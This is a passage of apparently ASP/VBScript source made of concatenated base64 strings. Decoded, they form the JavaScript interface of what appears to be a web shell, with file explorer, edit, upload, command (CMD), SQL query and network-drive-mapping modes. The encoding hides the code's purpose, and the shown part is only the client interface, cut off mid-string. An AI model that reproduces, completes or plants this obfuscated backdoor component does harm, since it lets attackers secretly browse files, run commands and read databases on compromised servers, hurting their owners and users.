"KTsKCX0KCWZpbmFsbHl7fQp9CgpmdW5jdGlvbiBzZXRJdGVtc0NvdW50KCkKewoJZ2V0SWQoImZvbGRlck5vIikuaW5uZXJIVE1MID0gZmZMaXN0LmZvbGRlcnMubGVuZ3RoICsgbm9Gb2xkZXI7CglnZXRJZCgiZmlsZU5vIikuaW5uZXJIVE1MID0gZmZMaXN0LmZpbGVzLmxlbmd0aCArIG5vRmlsZTsKCglnZXRJZCgidG90YWxG" &_
"b2xkZXJzIikuaW5uZXJIVE1MID0gZmZMaXN0LnN0YXR1cy50b3RhbEZvbGRlcnMgKyBub0ZvbGRlcjsKCWdldElkKCJ0b3RhbEZpbGVzIikuaW5uZXJIVE1MID0gZmZMaXN0LnN0YXR1cy50b3RhbEZpbGVzICsgbm9GaWxlOwp9CgpmdW5jdGlvbiBnZXRWYXIodXJsLGNudCkKewoJdXJsPXVybCsnIyc7Cgl1cmw9dXJsLnNwbGl0" &_
"KCcjJyk7CglpZiAoIXVybFsxXSkgd2luZG93LmxvY2F0aW9uLmhyZWYgPSAnI0V4cGxvcmVyfFxcJzsKCXVybD11cmxbMV07Cgl1cmw9dXJsKyd8JzsKCXVybD11cmwuc3BsaXQoJ3wnKTsKCWlmIChjbnQgIT0gLTEpIHsKCQl1cmw9dXJsW2NudF07CgkJaWYgKCF1cmwpIHJldHVybiAnJzsKCX0KCXJldHVybiB1bmVzY2FwZSh1" &_
"cmwpOwp9CgpmdW5jdGlvbiBsb2FkUGFnZSgpIHsKCWFjdCA9IGdldFZhcih3aW5kb3cubG9jYXRpb24uaHJlZiwwKTsKCglpZihnZXRWYXIobGFzdFVybCwwKSA9PSAnRXhwbG9yZXInKXsKCQlwb3NFeHAgPSBjdXJfcG9zKCk7Cgl9ZWxzZSBpZihnZXRWYXIobGFzdFVybCwwKSA9PSAnU1FMJyl7CgkJcG9zU1FMID0gY3VyX3Bv" &_
"cygpOwoJfQoKCWlmIChhY3QgPT0gJ0V4cGxvcmVyJykgewoJCXBvc0V4cCA9IDA7CgkJY3VycmVudF9sb2NhdGlvbj1nZXRWYXIod2luZG93LmxvY2F0aW9uLmhyZWYsMSkuYWRkU2xhc2goKTsKCQlpZiAoY3VycmVudF9sb2NhdGlvbikgc2VuZFJlcXVlc3QoY3VycmVudF9sb2NhdGlvbik7CgkJZWxzZSBzZW5kUmVxdWVzdCgn" &_
"XFwnKTsKCX0gZWxzZSBpZiAoYWN0ID09ICdFZGl0JykgewoJCWxvYWRGaWxlKCk7Cgl9IGVsc2UgaWYgKGFjdCA9PSAnVmlldycpIHsKCQlpbWdfdmlldyA9IG5ldyBJbWFnZSgpOwoJCWltZ192aWV3LnNyYyA9ICI/bW9kZT12aWV3JmltYWdlUGF0aD0iICsgZ2V0VmFyKHdpbmRvdy5sb2NhdGlvbi5ocmVmLDEpOwoJCWltZ192" &_
"aWV3Lm9uZXJyb3IgPSBmdW5jdGlvbigpe2FsZXJ0KCJDYW4gbm90IGxvYWQgdGhlIGltYWdlICEiKTtpbWdfdmlldyA9IG51bGw7fTsKCQlpbWdfdmlldy5vbmxvYWQgPSBmdW5jdGlvbigpe2lmKGltZ192aWV3LndpZHRoPjgwMCl7Z2V0SWQoImltZ1BpY3R1cmUiKS53aWR0aCA9ICI4MDAiO2dldElkKCJpbWdQaWN0dXJlIiku" &_
"aGVpZ2h0ID0gKGltZ192aWV3LmhlaWdodCAqIDgwMCAvIGltZ192aWV3LndpZHRoKTt9ZWxzZXtnZXRJZCgiaW1nUGljdHVyZSIpLndpZHRoID0gaW1nX3ZpZXcud2lkdGg7Z2V0SWQoImltZ1BpY3R1cmUiKS5oZWlnaHQgPSBpbWdfdmlldy5oZWlnaHQ7fWdldElkKCJpbWdQaWN0dXJlIikuc3JjID0gaW1nX3ZpZXcuc3JjO2lt" &_
"Z192aWV3ID0gbnVsbDt9OwoJCXNob3dNb2RlKGFjdCk7Cgl9ICBlbHNlIGlmIChhY3QgPT0gJ1NRTCcpIHsKCQlzaG93TW9kZShhY3QpOwoJfSAgZWxzZSBpZiAoYWN0ID09ICdDTUQnKSB7CgkJc2hvd01vZGUoYWN0KTsKCX0gIGVsc2UgaWYgKGFjdCA9PSAnVXBsb2FkJykgewoJCWdldElkKCJ1cGxvYWRMb2NhdGlvbiIpLmlu" &_
"bmVySFRNTCA9IGdldFZhcih3aW5kb3cubG9jYXRpb24uaHJlZiwxKS5hZGRTbGFzaCgpOwoJCWdldElkKCJ0eHR1cGxvYWRMb2NhdGlvbiIpLnZhbHVlID0gZ2V0VmFyKHdpbmRvdy5sb2NhdGlvbi5ocmVmLDEpLmFkZFNsYXNoKCk7CgkJZ2V0SWQoImxpbmtCYWNrIikudmFsdWUgPSBsYXN0VXJsQmFja3VwOwoJCXNob3dNb2Rl" &_
"KGFjdCk7Cgl9Cn0KCmZ1bmN0aW9uIGxvYWRNb3JlKCkgewoJaWYoIWZmTGlzdC5zdGF0dXMuZmluaXNoZWQpCgkJc2VuZFJlcXVlc3QoZmZMaXN0LmluZm8ucGF0aC5hZGRTbGFzaCgpLCBmZkxpc3Quc3RhdHVzLml0ZW1TdGFydCArIDIwMCk7Cn0KCmZ1bmN0aW9uIGN1cl9wb3MoKSB7Cgl2YXIgdG9wID0gZG9jdW1lbnQuYm9k" &_
"eS5zY3JvbGxUb3AKICAgID8gZG9jdW1lbnQuYm9keS5zY3JvbGxUb3AKICAgIDogKHdpbmRvdy5wYWdlWU9mZnNldAogICAgICAgID8gd2luZG93LnBhZ2VZT2Zmc2V0CiAgICAgICAgOiAoZG9jdW1lbnQuYm9keS5wYXJlbnRFbGVtZW50CiAgICAgICAgICAgID8gZG9jdW1lbnQuYm9keS5wYXJlbnRFbGVtZW50LnNjcm9sbFRv" &_
"cAogICAgICAgICAgICA6IDAKICAgICAgICApCiAgICApOwoKCXJldHVybiB0b3A7Cn0KCmZ1bmN0aW9uIHNob3dkaXYoaWQsIHNob3csIHRhYmxlKSB7CglnZXRJZChpZCkuc3R5bGUuZGlzcGxheSA9IChzaG93KSA/ICh0YWJsZSA/ICd0YWJsZScgOiAnYmxvY2snKSA6ICdub25lJzsKfQoKZnVuY3Rpb24gc2hvd01vZGUobW9k" &_
"ZSwgY2hhbmdlVXJsKSB7CgljdXJyX21vZGU9Z2V0VmFyKHdpbmRvdy5sb2NhdGlvbi5ocmVmLDApOwoJbGFzdF9tb2RlPWdldFZhcihsYXN0VXJsLDApOwoKCWlmKGxhc3RfbW9kZSA9PSAnRXhwbG9yZXInKXsKCQlwb3NFeHAgPSBjdXJfcG9zKCk7Cgl9ZWxzZSBpZihsYXN0X21vZGUgPT0gJ1NRTCcpewoJCXBvc1NRTCA9IGN1" &_
"cl9wb3MoKTsKCX0KCQoJaWYoY2hhbmdlVXJsICYmIGN1cnJfbW9kZSAhPSAiRXhwbG9yZXIiKQoJewoJCWxhc3RVcmwgPSBsYXN0VXJsQmFja3VwOwoJCXdpbmRvdy5sb2NhdGlvbi5ocmVmID0gbGFzdFVybEJhY2t1cDsKCQlnZXRJZCgicmVtb3RlIikudmFsdWUgPSBmZkxpc3QuaW5mby5wYXRoLmFkZFNsYXNoKCk7CgkJZ2V0" &_
"SWQoInJlbW90ZUNvcHkiKS52YWx1ZSA9IGZmTGlzdC5pbmZvLnBhdGguYWRkU2xhc2goKTsKCQlnZXRJZCgicmVtb3RlTW92ZSIpLnZhbHVlID0gZmZMaXN0LmluZm8ucGF0aC5hZGRTbGFzaCgpOwoJfQoKCWlmKG1vZGUgIT0gIlZpZXciKXsKCQlnZXRJZCgiaW1nUGljdHVyZSIpLnNyYyA9IGltZ19sb2FkaW5nLnNyYzsKCQln" &_
"ZXRJZCgiaW1nUGljdHVyZSIpLndpZHRoID0gaW1nX2xvYWRpbmcud2lkdGg7CgkJZ2V0SWQoImltZ1BpY3R1cmUiKS5oZWlnaHQgPSBpbWdfbG9hZGluZy5oZWlnaHQ7Cgl9CgoJc2hvd2RpdigidGJsQ29udGVudCIsIChtb2RlID09ICJFeHBsb3JlciIpLCB0cnVlKTsKCXNob3dkaXYoImZmTm8iLCAobW9kZSA9PSAiRXhwbG9y" &_
"ZXIiKSk7CglzaG93ZGl2KCJ0YmxEcml2ZXJzIiwgKG1vZGUgPT0gIkV4cGxvcmVyIiksIHRydWUpOwoKCXNob3dkaXYoInRibEZpbGVFZGl0IiwgKG1vZGUgPT0gIkVkaXQiKSwgdHJ1ZSk7CglzaG93ZGl2KCJ0YmxQaWN0dXJlIiwgKG1vZGUgPT0gIlZpZXciKSwgdHJ1ZSk7CglzaG93ZGl2KCJ0YmxVcGxvYWQiLCAobW9kZSA9" &_
"PSAiVXBsb2FkIiksIHRydWUpOwoJc2hvd2RpdigidGJsQ21kIiwgKG1vZGUgPT0gIkNNRCIpLCB0cnVlKTsKCXNob3dkaXYoInRibFNxbCIsIChtb2RlID09ICJTUUwiKSwgdHJ1ZSk7CgoJaWYobW9kZSA9PSAiRXhwbG9yZXIiICYmIGN1cnJfbW9kZSAhPSAiRXhwbG9yZXIiKXsKCQl3aW5kb3cuc2Nyb2xsVG8oMCwgcG9zRXhw" &_
"KTsKCX0KCQoJaWYobW9kZSA9PSAiRXhwbG9yZXIiICYmIGN1cnJfbW9kZSA9PSAiRXhwbG9yZXIiICYmIGNoYW5nZVVybCl7CgkJd2luZG93LnNjcm9sbFRvKDAsIDApOwoJfQoKCWlmKG1vZGUgPT0gIlNRTCIgJiYgbGFzdF9tb2RlICE9ICJTUUwiKXsKCQl3aW5kb3cuc2Nyb2xsVG8oMCwgcG9zU1FMKTsKCX0KCglpZihtb2Rl" &_
"ID09ICJTUUwiICYmIGxhc3RfbW9kZSA9PSAiU1FMIil7CgkJd2luZG93LnNjcm9sbFRvKDAsIDApOwoJfQp9CgpmdW5jdGlvbiBzaG93TWFwTmV0d29yaygpCnsKCWdldElkKCJvdmVybGF5Iikuc3R5bGUud2lkdGg9Z2V0UGFnZVNpemUoKVswXSsncHgnOwoJZ2V0SWQoIm92ZXJsYXkiKS5zdHlsZS5oZWlnaHQ9Z2V0UGFnZVNp" &_
"emUoKVsxXSsncHgnOwoKCXNob3dkaXYoIm92ZXJsYXkiLCB0cnVlKTsKCXNob3dkaXYoInRibE1hcERyaXZlciIsIHRydWUpOwp9CgpmdW5jdGlvbiBoaWRlTWFwTmV0d29yaygpCnsKCWdldElkKCJvdmVybGF5Iikuc3R5bGUud2lkdGg9JzBweCc7CglnZXRJZCgib3ZlcmxheSIpLnN0eWxlLmhlaWdodD0nMHB4JzsKCglzaG93" &_
"ZGl2KCJvdmVybGF5IiwgZmFsc2UpOwoJc2hvd2RpdigidGJsTWFwRHJpdmVyIiwgZmFsc2UpOwp9CgpmdW5jdGlvbiBzaG93TG9hZGluZygpCnsKCWdldElkKCJvdmVybGF5Iikuc3R5bGUud2lkdGg9Z2V0UGFnZVNpemUoKVswXSsncHgnOwoJZ2V0SWQoIm92ZXJsYXkiKS5zdHlsZS5oZWlnaHQ9Z2V0UGFnZVNpemUoKVsxXSsn" &_
"cHgnOwoKCXNob3dkaXYoIm92ZXJsYXkiLCB0cnVlKTsKCXNob3dkaXYoInRibExvYWRpbmciLCB0cnVlKTsKfQoKZnVuY3Rpb24gaGlkZUxvYWRpbmcoKQp7CglzaG93ZGl2KCJvdmVybGF5IiwgZmFsc2UpOwoJc2hvd2RpdigidGJsTG9hZGluZyIsIGZhbHNlKTsKCWdldElkKCJvdmVybGF5Iikuc3R5bGUud2lkdGg9JzBweCc7" &_
"CglnZXRJZCgib3ZlcmxheSIpLnN0eWxlLmhlaWdodD0nMHB4JzsKfQoKZnVuY3Rpb24gZ2V0UGFnZVNpemUoKSB7CgoJIHZhciB4U2Nyb2xsLCB5U2Nyb2xsOwoKCWlmICh3aW5kb3cuaW5uZXJIZWlnaHQgJiYgd2luZG93LnNjcm9sbE1heFkpIHsKCQl4U2Nyb2xsID0gd2luZG93LmlubmVyV2lkdGggKyB3aW5kb3cuc2Nyb2xs" &_
"TWF4WDsKCQl5U2Nyb2xsID0gd2luZG93LmlubmVySGVpZ2h0ICsgd2luZG93LnNjcm9sbE1heFk7Cgl9IGVsc2UgaWYgKGRvY3VtZW50LmJvZHkuc2Nyb2xsSGVpZ2h0ID4gZG9jdW1lbnQuYm9keS5vZmZzZXRIZWlnaHQpeyAvLyBhbGwgYnV0IEV4cGxvcmVyIE1hYwoJCXhTY3JvbGwgPSBkb2N1bWVudC5ib2R5LnNjcm9sbFdp" &_
"ZHRoOwoJCXlTY3JvbGwgPSBkb2N1bWVudC5ib2R5LnNjcm9sbEhlaWdodDsKCX0gZWxzZSB7IC8vIEV4cGxvcmVyIE1hYy4uLndvdWxkIGFsc28gd29yayBpbiBFeHBsb3JlciA2IFN0cmljdCwgTW96aWxsYSBhbmQgU2FmYXJpCgkJeFNjcm9sbCA9IGRvY3VtZW50LmJvZHkub2Zmc2V0V2lkdGg7CgkJeVNjcm9sbCA9IGRvY3Vt" &_
"ZW50LmJvZHkub2Zmc2V0SGVpZ2h0OwoJfQoKCXZhciB3aW5kb3dXaWR0aCwgd2luZG93SGVpZ2h0OwoKCWlmIChzZWxmLmlubmVySGVpZ2h0KSB7CS8vIGFsbCBleGNlcHQgRXhwbG9yZXIKCQlpZihkb2N1bWVudC5kb2N1bWVudEVsZW1lbnQuY2xpZW50V2lkdGgpewoJCQl3aW5kb3dXaWR0aCA9IGRvY3VtZW50LmRvY3VtZW50" &_
"RWxlbWVudC5jbGllbnRXaWR0aDsKCQl9IGVsc2UgewoJCQl3aW5kb3dXaWR0aCA9IHNlbGYuaW5uZXJXaWR0aDsKCQl9CgkJd2luZG93SGVpZ2h0ID0gc2VsZi5pbm5lckhlaWdodDsKCX0gZWxzZSBpZiAoZG9jdW1lbnQuZG9jdW1lbnRFbGVtZW50ICYmIGRvY3VtZW50LmRvY3VtZW50RWxlbWVudC5jbGllbnRIZWlnaHQpIHsg" &_
"Ly8gRXhwbG9yZXIgNiBTdHJpY3QgTW9kZQoJCXdpbmRvd1dpZHRoID0gZG9jdW1lbnQuZG9jdW1lbnRFbGVtZW50LmNsaWVudFdpZHRoOwoJCXdpbmRvd0hlaWdodCA9IGRvY3VtZW50LmRvY3VtZW50RWxlbWVudC5jbGllbnRIZWlnaHQ7Cgl9IGVsc2UgaWYgKGRvY3VtZW50LmJvZHkpIHsgLy8gb3RoZXIgRXhwbG9yZXJzCgkJ" &_
"d2luZG93V2lkdGggPSBkb2N1bWVudC5ib2R5LmNsaWVudFdpZHRoOwoJCXdpbmRvd0hlaWdodCA9IGRvY3VtZW50LmJvZHkuY2xpZW50SGVpZ2h0OwoJfQoKCS8vIGZvciBzbWFsbCBwYWdlcyB3aXRoIHRvdGFsIGhlaWdodCBsZXNzIHRoZW4gaGVpZ2h0IG9mIHRoZSB2aWV3cG9ydAoJaWYoeVNjcm9sbCA8IHdpbmRvd0hlaWdo" &_
"dCl7CgkJcGFnZUhlaWdodCA9IHdpbmRvd0hlaWdodDsKCX0gZWxzZSB7CgkJcGFnZUhlaWdodCA9IHlTY3JvbGw7Cgl9CgoJLy8gZm9yIHNtYWxsIHBhZ2VzIHdpdGggdG90YWwgd2lkdGggbGVzcyB0aGVuIHdpZHRoIG9mIHRoZSB2aWV3cG9ydAoJaWYoeFNjcm9sbCA8IHdpbmRvd1dpZHRoKXsKCQlwYWdlV2lkdGggPSB4U2Ny" &_
"b2xsOwoJfSBlbHNlIHsKCQlwYWdlV2lkdGggPSB3aW5kb3dXaWR0aDsKCX0KCglyZXR1cm4gW3BhZ2VXaWR0aCxwYWdlSGVpZ2h0XTsKfQoKZnVuY3Rpb24gdXJsQ2hlY2soKQp7Cgl1cmw9d2luZG93LmxvY2F0aW9uLmhyZWY7CglpZiAodXJsICE9ICcnICYmIHVybCE9bGFzdFVybCkKCXsKCQlpZighY3VycmVudF9ydW5uaW5n" &_
"KXsKCQkJbG9hZFBhZ2UoKTsKCQkJbGFzdFVybD11cmw7CgkJfWVsc2V7CgkJCWFsZXJ0KCJMZXQgdGhlIGN1cnJlbnRseSBydW5uaW5nIHRhc2sgZmluaXNoIGZpcnN0ICEiKTsKCQkJd2luZG93LmxvY2F0aW9uLmhyZWYgPSBsYXN0VXJsOwoJCX0KCX0KfQoKZnVuY3Rpb24gc3RhcnRMb2FkKCkgewoJaW1nX2xvYWRpbmcgPSAg" &_
"bmV3IEltYWdlKCk7CglpbWdfbG9hZGluZy5zcmM9Ij9tb2RlPWltYWdlJmltZ0lkPWxvYWRpbmciOwoJLy9hZGRFdmVudChkb2N1bWVudCwgImtleWRvd24iLCBrZXlDYXB0dXJlLCB0cnVlKTsKCWludGVydmFsID0gc2V0SW50ZXJ2YWwoJ3VybENoZWNrKCknLDEwMCk7Cn0KCgpmdW5jdGlvbiBhZGRUUihpZCwgeHR5cGUsIGNz" &_
"c0NsYXNzKSB7CiAgdmFyIG5ld1RSID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnVFInKTsKICBuZXdUUi5zZXRBdHRyaWJ1dGUoJ2lkJyx4dHlwZSsnJytpZCk7CiAgaWYoY3NzQ2xhc3MpCgluZXdUUi5zZXRBdHRyaWJ1dGUoKGlzSUUgPyAnY2xhc3NOYW1lJyA6ICdjbGFzcycpLCBjc3NDbGFzcyk7CnJldHVybiBuZXdUUjsK" &_
"fQoKZnVuY3Rpb24gYWRkVEQodGV4dCwgY3NzQ2xhc3MsIHdpZHRoLCBhbGlnbikgewogIHZhciBuZXdURCA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoJ1REJyk7CiAgbmV3VEQuaW5uZXJIVE1MID0gdGV4dDsKICBpZihjc3NDbGFzcykKCW5ld1RELnNldEF0dHJpYnV0ZSgoaXNJRSA/ICdjbGFzc05hbWUnIDogJ2NsYXNzJyks" &_
"IGNzc0NsYXNzKTsKICBpZih3aWR0aCkKCW5ld1RELnNldEF0dHJpYnV0ZSgnd2lkdGgnLHdpZHRoKTsKICBpZihhbGlnbikKCW5ld1RELnNldEF0dHJpYnV0ZSgnYWxpZ24nLGFsaWduKTsKcmV0dXJuIG5ld1REOwp9CgpmdW5jdGlvbiBhZGRUQk9EWShpZCkgewogIHZhciBuZXdUQk9EWSA9IGRvY3VtZW50LmNyZWF0ZUVsZW1l" &_
"bnQoJ1RCT0RZJyk7CiAgaWYoaWQpCgluZXdUQk9EWS5zZXRBdHRyaWJ1dGUoJ2lkJywgaWQpOwpyZXR1cm4gbmV3VEJPRFk7Cn0KCmZ1bmN0aW9uIGFkZFRIRUFEKGlkKSB7CiAgdmFyIG5ld1RIRUFEID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnVEhFQUQnKTsKICBpZihpZCkKCW5ld1RIRUFELnNldEF0dHJpYnV0ZSgnaWQn" &_
"LCBpZCk7CnJldHVybiBuZXdUSEVBRDsKfQoKZnVuY3Rpb24gYWRkTGluayh0ZXh0LCBocmVmLCBjc3NDbGFzcykgewogIHZhciBuZXdMaW5rID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnQScpOwogIG5ld0xpbmsuaW5uZXJIVE1MID0gdGV4dDsKICBpZihocmVmKQoJbmV3TGluay5zZXRBdHRyaWJ1dGUoJ2hyZWYnLCBocmVm" &_
"KTsKICBpZihjc3NDbGFzcykKCW5ld0xpbmsuc2V0QXR0cmlidXRlKChpc0lFID8gJ2NsYXNzTmFtZScgOiAnY2xhc3MnKSwgY3NzQ2xhc3MpOwpyZXR1cm4gbmV3TGluazsKfQoKZnVuY3Rpb24gZGlzcGxheVNRTENvbnRlbnQoc3FsUmVzdWx0KQp7Cgl3aGlsZShnZXRJZCgic3FsQ29udGVudCIpLmhhc0NoaWxkTm9kZXMoKSkK" &_
"CXsKCQlnZXRJZCgic3FsQ29udGVudCIpLnJlbW92ZUNoaWxkKGdldElkKCJzcWxDb250ZW50IikuZmlyc3RDaGlsZCk7Cgl9CgoJaWYoc3FsUmVzdWx0LmFjdGlvbi5oZWFkZXIubGVuZ3RoID4gMCl7CgkJZ2V0SWQoImFmZmVjdGVkIikuaW5uZXJIVE1MID0gc3FsUmVzdWx0LmFjdGlvbi5kYXRhLmxlbmd0aDsKCQlnZXRJZCgi" &_
"bHN0QWZmIikuaW5uZXJIVE1MID0gImxpc3RlZCI7Cgl9ZWxzZXsKCQlnZXRJZCgiYWZmZWN0ZWQiKS5pbm5lckhUTUwgPSBzcWxSZXN1bHQuYWN0aW9uLmFmZmVjdGVkOwoJCWdldElkKCJsc3RBZmYiKS5pbm5lckhUTUwgPSAiYWZmZWN0ZWQiOwoJfQoKCWlmKHNxbFJlc3VsdC5hY3Rpb24uaGVhZGVyICYmIHNxbFJlc3VsdC5h" &_
"Y3Rpb24uaGVhZGVyLmxlbmd0aCA+IDApewoJCW5ld0hlYWQgPSBhZGRUSEVBRCgpOwoJCW5ld1JvdyA9IGFkZFRSKDAsICJzcWxIZWFkIik7CgkJZm9yIChpPTA7aTxzcWxSZXN1bHQuYWN0aW9uLmhlYWRlci5sZW5ndGg7aSsrKQoJCXsKCQkJbmV3Q29sID0gYWRkVEQoc3FsUmVzdWx0LmFjdGlvbi5oZWFkZXJbaV0sICJ0YWJs" &_
"ZUhlYWQiKTsKCQkJbmV3Um93LmFwcGVuZENoaWxkKG5ld0NvbCk7CgkJfQoJCW5ld0hlYWQuYXBwZW5kQ2hpbGQobmV3Um93KTsKCQlnZXRJZCgic3FsQ29udGVudCIpLmFwcGVuZENoaWxkKG5ld0hlYWQpOwoKCQluZXdUYm9keSA9IGFkZFRCT0RZKCJyb3dDb250ZW50Iik7CgkJZm9yIChpPTA7aTxzcWxSZXN1bHQuYWN0aW9u" &_
"LmRhdGEubGVuZ3RoO2krKykKCQl7CgkJCW5ld1JvdyA9IGFkZFRSKGksICJzcWxSb3ciKTsKCQkJCWZvciAoaj0wO2o8c3FsUmVzdWx0LmFjdGlvbi5kYXRhW2ldLmxlbmd0aDtqKyspCgkJCQl7CgkJCQkJbmV3Q29sID0gYWRkVEQoc3FsUmVzdWx0LmFjdGlvbi5kYXRhW2ldW2pdLCAia2JydG0iKTsKCQkJCQluZXdSb3cuYXBw" &_
"ZW5kQ2hpbGQobmV3Q29sKTsKCQkJCX0KCQkJbmV3VGJvZHkuYXBwZW5kQ2hpbGQobmV3Um93KTsKCQl9CgkJZ2V0SWQoInNxbENvbnRlbnQiKS5hcHBlbmRDaGlsZChuZXdUYm9keSk7Cgl9Cn0KCmZ1bmN0aW9uIGRpc3BsYXlDb250ZW50KGZvbGRlck5ldywgZmlsZU5ldykKewoJaWYoIWZmTGlzdCkKCXsKCQlyZXR1cm47Cgl9" &_
"CgoJaWYoZmZMaXN0LmZvbGRlcnMubGVuZ3RoIC0gZm9sZGVyTmV3ID09IDAgJiYgZmZMaXN0LmZpbGVzLmxlbmd0aCAtIGZpbGVOZXcgPT0gMCl7CgkJY2xlYXJDb250ZW50KCk7CgoJCXZhciBuZXd0YmxMaXN0ID0gYWRkVEJPRFkoJ3RibExpc3QnKTsKCQlnZXRJZCgidGJsQ29udGVudCIpLmluc2VydEJlZm9yZShuZXd0YmxM" &_
"aXN0LCBnZXRJZCgidGJsQ29tbWFuZCIpKTsKCgkJbGV2ZWxSb290ID0gZmZMaXN0LmluZm8ucGF0aC5zcGxpdCgiXFwiKTsKCQlsZXZlbFJvb3QgPSBsZXZlbFJvb3RbMF07CgoJCWxldmVsVXAgPSBmZkxpc3QuaW5mby5wYXRoLnNwbGl0KCJcXCIpOwoJCWxldmVsVXAgPSBmZkxpc3QuaW5mby5wYXRoLnJlcGxhY2UobGV2ZWxV" &_
"cFtsZXZlbFVwLmxlbmd0aC0yXSsiXFwiLCAiIik7CgoJCWlmKGxldmVsVXAgPT0gIiIgfHwgbGV2ZWxVcCA9PSBudWxsKQoJCQlsZXZlbFVwID0gbGV2ZWxSb290KyJcXCI7CgoJCQluZXdSb3cgPSBhZGRUUigwLCAicm9vdCIpOwoJCQluZXdMaW5rID0gYWRkTGluaygiW1Jvb3RdIFxcIiwgIiIrZmZMaXN0LmluZm8uZmlsZXBh" &_
"dGgrIiNFeHBsb3JlcnwiK2xldmVsUm9vdCsiXFwiKTsKCQkJbmV3Q29sID0gYWRkVEQoIiZuYnNwOyZuYnNwOzxpbWcgc3JjPSc/bW9kZT1pbWFnZSZpbWdJZD1kaXInPiIsICJrYnJ0bSIpOwoJCQluZXdDb2wuYXBwZW5kQ2hpbGQobmV3TGluayk7CgkJCW5ld1Jvdy5hcHBlbmRDaGlsZChuZXdDb2wpOwoJCQluZXdSb3cuYXBw" &_
"ZW5kQ2hpbGQoYWRkVEQoIiZuYnNwOyIsICJrYnJ0bSIpKTsKCQkJbmV3Um93LmFwcGVuZENoaWxkKGFkZFREKCJESVIiLCAia2JydG0iLCAiIiwgImNlbnRlciIpKTsKCQkJbmV3Um93LmFwcGVuZENoaWxkKGFkZFREKCImbmJzcDsiLCAia2JydG0iKSk7CgkJCW5ld1Jvdy5hcHBlbmRDaGlsZChhZGRURCgiJm5ic3A7IiwgImti" &_
"cnRtIikpOwoJCQluZXdSb3cuYXBwZW5kQ2hpbGQoYWRkVEQoIiZuYnNwOyIsICJrYnJ0bSIpKTsKCQkJbmV3Um93LmFwcGVuZENoaWxkKGFkZFREKCImbmJzcDsiLCAia2JydG0iKSk7CgkJCW5ld1Jvdy5hcHBlbmRDaGlsZChhZGRURCgiJm5ic3A7IiwgImticnRtIikpOwoJCQlnZXRJZCgidGJsTGlzdCIpLmFwcGVuZENoaWxk" &_
"KG5ld1Jvdyk7CgoJCQluZXdSb3cgPSBhZGRUUigwLCAidXAiKTsKCQkJbmV3TGluayA9IGFkZExpbmsoIltVcF0gLi4iLCAiIitmZkxpc3QuaW5mby5maWxlcGF0aCsiI0V4cGxvcmVyfCIrbGV2ZWxVcCk7CgkJCW5ld0NvbCA9IGFkZFREKCImbmJzcDsmbmJzcDs8aW1nIHNyYz0nP21vZGU9aW1hZ2UmaW1nSWQ9bHZ1cCc+Iiwg" &_
"ImticnRtIik7CgkJCW5ld0NvbC5hcHBlbmRDaGlsZChuZXdMaW5rKTsKCQkJbmV3Um93LmFwcGVuZENoaWxkKG5ld0NvbCk7CgkJCW5ld1Jvdy5hcHBlbmRDaGlsZChhZGRURCgiJm5ic3A7IiwgImticnRtIikpOwoJCQluZXdSb3cuYXBwZW5kQ2hpbGQoYWRkVEQoIkRJUiIsICJrYnJ0bSIsICIiLCAiY2VudGVyIikpOwoJCQlu" &_
"ZXdSb3cuYXBwZW5kQ2hpbGQoYWRkVEQoIiZuYnNwOyIsICJrYnJ0bSIpKTsKCQkJbmV3Um93LmFwcGVuZENoaWxkKGFkZFREKCImbmJzcDsiLCAia2JydG0iKSk7CgkJCW5ld1Jvdy5hcHBlbmRDaGlsZChhZGRURCgiJm5ic3A7IiwgImticnRtIikpOwoJCQluZXdSb3cuYXBwZW5kQ2hpbGQoYWRkVEQoIiZuYnNwOyIsICJrYnJ0" &_
"bSIpKTsKCQkJbmV3Um93LmFwcGVuZENoaWxkKGFkZFREKCImbmJzcDsiLCAia2JydG0iKSk7CgkJCWdldElkKCJ0YmxMaXN0IikuYXBwZW5kQ2hpbGQobmV3Um93KTsKCgkJCW5ld1JvdyA9IGFkZFRSKDAsICJnYXAiKTsKCQkJbmV3Um93LmFwcGVuZENoaWxkKGFkZFREKCImbmJzcDsiLCAia2JydG0iKSk7CgkJCW5ld1Jvdy5h" &_
"cHBlbmRDaGlsZChhZGRURCgiJm5ic3A7IiwgImticnRtIikpOwoJCQluZXdSb3cuYXBwZW5kQ2hpbGQoYWRkVEQoIiZuYnNwOyIsICJrYnJ0bSIpKTsKCQkJbmV3Um93LmFwcGVuZENoaWxkKGFkZFREKCImbmJzcDsiLCAia2JydG0iKSk7CgkJCW5ld1Jvdy5hcHBlbmRDaGlsZChhZGRURCgiJm5ic3A7IiwgImticnRtIikpOwoJ" &_
"CQluZXdSb3cuYXBwZW5kQ2hpbGQoYWRkVEQoIiZuYnNwOyIsICJrYnJ0bSIpKTsKCQkJbmV3Um93LmFwcGVuZENoaWxkKGFkZFREKCImbmJzcDsiLCAia2JydG0iKSk7CgkJCW5ld1Jvdy5hcHBlbmRDaGlsZChhZGRURCgiJm5ic3A7IiwgImticnRtIikpOwoJCQlnZXRJZCgidGJsTGlzdCIpLmFwcGVuZENoaWxkKG5ld1Jvdyk7" &_
"Cgl9CgoJaWYoZmZMaXN0LmZvbGRlcnMpewoJCXNldEl0ZW1zQ291bnQoKTsKCQlmb3IgKGk9ZmZMaXN0LmZvbGRlcnMubGVuZ3RoIC0gZm9sZGVyTmV3O2k8ZmZMaXN0LmZvbGRlcnMubGVuZ3RoO2krKykKCQl7CgkJCWdldElkKCJ0YmxMaXN0IikuaW5zZXJ0QmVmb3JlKGFkZEZvbGRlclJvdyhpKSwgZ2V0SWQoImdhcDAiKSk7" &_
"CgkJfQoJfWVsc2V7CgkJZ2V0SWQoImZvbGRlck5vIikuaW5uZXJIVE1MID0gIjAiOwoJfQoKCWlmKGZmTGlzdC5maWxlcyl7CgkJc2V0SXRlbXNDb3VudCgpOwoJCWZvciAoaT1mZkxpc3QuZmlsZXMubGVuZ3RoIC0gZmlsZU5ldztpPGZmTGlzdC5maWxlcy5sZW5ndGg7aSsrKQoJCXsKCQkJZ2V0SWQoInRibExpc3QiKS5pbnNl" &_
